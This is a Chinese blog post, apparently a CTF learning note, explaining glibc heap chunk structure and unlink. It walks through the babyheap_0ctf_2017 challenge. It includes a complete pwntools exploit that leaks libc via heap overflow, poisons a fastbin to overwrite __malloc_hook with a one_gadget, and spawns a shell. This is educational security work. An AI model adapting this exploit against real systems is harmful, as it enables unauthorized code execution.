{"title":"堆","uid":"c4bf9a47934395d80559cc60b6290065","slug":"堆","date":"2021-11-23T14:10:20.000Z","updated":"2021-12-05T05:02:19.781Z","comments":true,"path":"api/articles/堆.json","keywords":null,"cover":"https://i.loli.net/2021/11/25/Z485hvdikxGYrAS.jpg","content":"<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>在栈上拖了好久才进入堆，这里就介绍一下这几天所学的内容</p></blockquote>\n<h1 id=\"什么是堆\"><a href=\"#什么是堆\" class=\"headerlink\" title=\"什么是堆\"></a>什么是堆</h1><ol>\n<li><p>堆不同于栈，栈是静态分布，也就是程序加载进内存就会分配，而堆则是在程序执行时需要才会分配（由malloc、alloc、realloc函数分配内存后出现）。</p>\n</li>\n<li><p>堆其实就是程序虚拟地址空间的一块连续的线性区域，生长方向与栈相反，堆是由低地址向高地址生长，而栈是由高地址向低地址生长。</p>\n</li>\n<li><p>堆可以申请的内存空间比栈要大很多，堆在linux的4G的虚拟空间里面最高可申请2.9G空间</p>\n</li>\n<li><p>堆的操作是由堆管理器（ptmalloc2）来实现，并不是由操作系统内核管理。因为程序每次申请或释放堆时都需要进行系统调用，系统调用的开销巨大，频繁进行堆操作时，会严重影响程序的性能。</p>\n</li>\n</ol>\n<h1 id=\"堆的基本结构\"><a href=\"#堆的基本结构\" class=\"headerlink\" title=\"堆的基本结构\"></a>堆的基本结构</h1><p><strong>1.pre_size字段</strong>：只有当前面一个堆块是空闲时才有值，用来指示前面一个堆块的大小。当前面的堆块在使用时，它的值为0</p>\n<p><strong>2.size字段</strong>：用来指示当前堆块的大小（包括头部以及user data的大小）。最后三位相当于三个flag：</p>\n<ul>\n<li><p><strong>NON_MAIN_ARENA</strong>：判断这个堆块是否位于主线程</p>\n</li>\n<li><p><strong>IS_MAPPED</strong>：记录当前chunk是否由mmap分配</p>\n</li>\n<li><p><strong>PREV_INUSE</strong>：记录当前chunk块是否北分配（如果被分配这个字段的值为1，所以经常会在已分配的堆块中的size比原来大1个字节</p>\n</li>\n</ul>\n<p><strong>3.fd，bk</strong>。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下</p>\n<ul>\n<li><strong>fd</strong> 指向下一个（非物理相邻）空闲的 chunk</li>\n<li><strong>bk</strong> 指向上一个（非物理相邻）空闲的 chunk</li>\n</ul>\n<p>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</p>\n<p><strong>4.fd_nextsize， bk_nextsize</strong>，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。</p>\n<p><strong>fd_nextsize</strong> 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p>\n<p><strong>bk_nextsize</strong> 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p>\n<p>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。</p>\n<p><img src=\"https://i.loli.net/2021/11/23/hRXmqAarcV9Yuib.png\" alt=\"image.png\"></p>\n<h1 id=\"bins\"><a href=\"#bins\" class=\"headerlink\" title=\"bins\"></a>bins</h1><p>这些就不多赘述了，ctfwiki上面讲的比我的好</p>\n<h1 id=\"Unlink机制\"><a href=\"#Unlink机制\" class=\"headerlink\" title=\"Unlink机制\"></a>Unlink机制</h1><p>unlink是堆溢出中的一种常见的利用形式，通过将双向列表中的空闲块拿出来与将要free的物理相邻的块进行合并。</p>\n<h2 id=\"如何触发unlink\"><a href=\"#如何触发unlink\" class=\"headerlink\" title=\"如何触发unlink\"></a>如何触发unlink</h2><p>当使用free函数释放正在使用的chunk时，会相应地检查其相邻的chunk是否为空闲，如果为空闲则会将相邻的chunk与free的chunk进行合</p>\n<h1 id=\"实操\"><a href=\"#实操\" class=\"headerlink\" title=\"实操\"></a>实操</h1><p>就拿buu上面babyheap_0ctf_2017一题来讲</p>\n<p>check一下，64位全保护</p>\n<p><img src=\"https://i.loli.net/2021/11/25/CBo3rd7izHUQn9I.png\" alt=\"image.png\"></p>\n<p>反汇编看看<img src=\"https://i.loli.net/2021/11/25/bMlnp2wti1Iv5WE.png\" alt=\"image.png\"></p>\n<p>存在堆溢出<img src=\"https://i.loli.net/2021/11/25/gURA8YHSL5sqyFP.png\" alt=\"image.png\"></p>\n<p>堆溢出不像栈溢出，栈溢出可以通过构造ROP从而控制程序执行流，而堆溢出不能直接控制，堆溢出只能从当前chunk覆盖下一个chunk</p>\n<h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>我们应该如何控制程序？其实在申请chunk时，会执行malloc_hook函数，我们可以修改malloc_hook函数got表，让他执行我们想要执行的函数或者one_gadget。</p>\n<p>所以现在我们要解决的问题是：</p>\n<ol>\n<li>如何获取malloc_hook的got表地址</li>\n<li>如何修改malloc_hook的got表</li>\n<li>如何getshell</li>\n</ol>\n<p>问题1：</p>\n<p>我们可以通过堆溢出覆盖到下一个chunk，从而让下一个chunk指向main_arena，再使用dump输出即可泄露</p>\n<p>问题2：</p>\n<p>我们可以free掉中间一个chunk，之后利用下一个chunk实现堆溢出，从而修改中间chunk的fd指针指向含main_arena的got表的chunk，我们只要再申请相同大小的chunk就可以利用fill函数修改malloc_hook的got表</p>\n<p>问题3：</p>\n<p>修改malloc_hook的got表为one_gadget，之后我们再申请一个chunk时，就会执行one_gadget从而获取shell</p>\n<p>接下来开始操作</p>\n<p>先根据反汇编写出对应的函数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">alloc</span>(<span class=\"params\">size</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fill</span>(<span class=\"params\">idx,payload</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;2&#x27;</span>) </span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(payload)))</span><br><span class=\"line\">    p.send(payload) </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))   </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>) </span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))    </span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Content: \\n&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>申请四个chunk，防止chunk被free后与topchunk合并</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x40</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x20</span>)<span class=\"comment\">#3</span></span><br></pre></td></tr></table></figure>\n\n<p>接下来就是堆溢出修改chunk1的size大小，free后输出chunk2获取main_arena</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fill(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x68</span>+p64(<span class=\"number\">0xc1</span>))</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#1</span></span><br></pre></td></tr></table></figure>\n\n<p>这样chunk2就会一起进入fastbin，但是chunk2并没有被清空<img src=\"https://i.loli.net/2021/11/25/XD4ZJIgLqxWOQkj.png\" alt=\"image.png\"></p>\n<p>当chunk1和chunk2进入fastbin后，再次申请chunk1大小的chunk后，chunk1会离开fastbin，之后chunk2就会指向main_arean+88</p>\n<p><img src=\"https://i.loli.net/2021/11/25/wLPSeHTuMhKfbVo.png\" alt=\"image.png\"></p>\n<p>因为chunk2没有被清空，所以我们可以输出chunk2，从而获取main_arean的地址，进而获取malloc_chunk的地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dump(<span class=\"number\">2</span>)</span><br><span class=\"line\">libc_base = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-main_are-<span class=\"number\">88</span></span><br><span class=\"line\">print(<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">malloc_chunk = libc.symbols[<span class=\"string\">&quot;__malloc_hook&quot;</span>]+libc_base</span><br></pre></td></tr></table></figure>\n\n<p>接下来利用思路主要是double free：free(1)change chunk1的fd指针,第二次申请到的就是fakechunk ，填充 malloc hook覆盖指针为onegadget</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">fill(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x60</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x71</span>)+p64(malloc_chunk-<span class=\"number\">0x23</span>))</span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#5</span></span><br><span class=\"line\">fill(<span class=\"number\">5</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>+<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>+p64(ogg[<span class=\"number\">1</span>]+libc_base)) </span><br></pre></td></tr></table></figure>\n\n<p>malloc_hook在chunk头后面23字节处，所以用户输入位置在23-size=13的位置，所以填充13字节后修改成one_gadget即可</p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./babyheap&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = remote(&#x27;node4.buuoj.cn&#x27;,28886)</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&quot;/home/krito/CTF/buu/libc/libc-2.23.so&quot;)</span></span><br><span class=\"line\">main_are =<span class=\"number\">0x3c4b20</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">alloc</span>(<span class=\"params\">size</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fill</span>(<span class=\"params\">idx,payload</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;2&#x27;</span>) </span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(payload)))</span><br><span class=\"line\">    p.send(payload) </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))   </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>) </span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))    </span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Content: \\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#log.success(&quot;-----------------------leak libc-------------------------&quot;)</span></span><br><span class=\"line\">ogg = [<span class=\"number\">0x45226</span>,<span class=\"number\">0x4527a</span>,<span class=\"number\">0xf03a4</span>,<span class=\"number\">0xf1247</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x40</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x20</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">fill(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x68</span>+p64(<span class=\"number\">0xc1</span>))</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">dump(<span class=\"number\">2</span>)</span><br><span class=\"line\">libc_base = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-main_are-<span class=\"number\">88</span></span><br><span class=\"line\">print(<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">malloc_chunk = libc.symbols[<span class=\"string\">&quot;__malloc_hook&quot;</span>]+libc_base</span><br><span class=\"line\">alloc(<span class=\"number\">0x40</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">fill(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x60</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x71</span>)+p64(malloc_chunk-<span class=\"number\">0x23</span>))</span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#5</span></span><br><span class=\"line\">fill(<span class=\"number\">5</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>+<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>+p64(ogg[<span class=\"number\">1</span>]+libc_base))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x100</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n","feature":true,"text":" 在栈上拖了好久才进入堆，这里就介绍一下这几天所学的内容 什么是堆 堆不同于栈，栈是静态分布，也就是程序加载进内存就会分配，而堆则是在程序执行时需要才会分配（由malloc、alloc、realloc函数分配内存后出现）。 堆其实就是程序虚拟地址空间的一块连续的线性区域，生长方向...","link":"","photos":[],"count_time":{"symbolsCount":"4.8k","symbolsTime":"4 mins."},"categories":[{"name":"pwn","slug":"pwn","count":3,"path":"api/categories/pwn.json"}],"tags":[{"name":"笔记","slug":"笔记","count":3,"path":"api/tags/笔记.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AF%E5%A0%86\"><span class=\"toc-text\">什么是堆</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A0%86%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84\"><span class=\"toc-text\">堆的基本结构</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#bins\"><span class=\"toc-text\">bins</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Unlink%E6%9C%BA%E5%88%B6\"><span class=\"toc-text\">Unlink机制</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91unlink\"><span class=\"toc-text\">如何触发unlink</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%93%8D\"><span class=\"toc-text\">实操</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"off-by-one","uid":"bd9db8b2380b14fbad4621ba09b4c803","slug":"off-by-one","date":"2021-12-03T13:24:02.000Z","updated":"2021-12-26T12:50:48.560Z","comments":true,"path":"api/articles/off-by-one.json","keywords":null,"cover":"https://s2.loli.net/2021/12/26/8dARZTCroeUzIg5.jpg","text":"介绍off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。这个字节可能是任意可控的或者是NULL字节。以下是对两种情况的利用方法 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖...","link":"","photos":[],"count_time":{"symbolsCount":"4.4k","symbolsTime":"4 mins."},"categories":[{"name":"学习记录","slug":"学习记录","count":3,"path":"api/categories/学习记录.json"}],"tags":[{"name":"pwn","slug":"pwn","count":7,"path":"api/tags/pwn.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"西湖论剑pwn复现","uid":"08ca8a643d07b9ceeb8a1eb3cf2f50b4","slug":"西湖论剑pwn复现","date":"2021-11-22T13:19:10.000Z","updated":"2021-11-22T23:24:05.390Z","comments":true,"path":"api/articles/西湖论剑pwn复现.json","keywords":null,"cover":"https://i.loli.net/2021/11/23/3mXuv9PTqLHU726.jpg","text":" 第一次参加西湖论剑，技术不够，一题没出，希望明年能够出个两三道 blind听darry👴说远端的libc被魔改了，对不上，加上没有远端环境，所以我就讲一下本地如何打通的。（全程darry👴讲解） 我一开始没注意到开了NX保护，所以想利用构造read函数让函数跳转执行shellc...","link":"","photos":[],"count_time":{"symbolsCount":"5.8k","symbolsTime":"5 mins."},"categories":[{"name":"PWN","slug":"PWN","count":2,"path":"api/categories/PWN.json"}],"tags":[{"name":"wp","slug":"wp","count":2,"path":"api/tags/wp.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}}}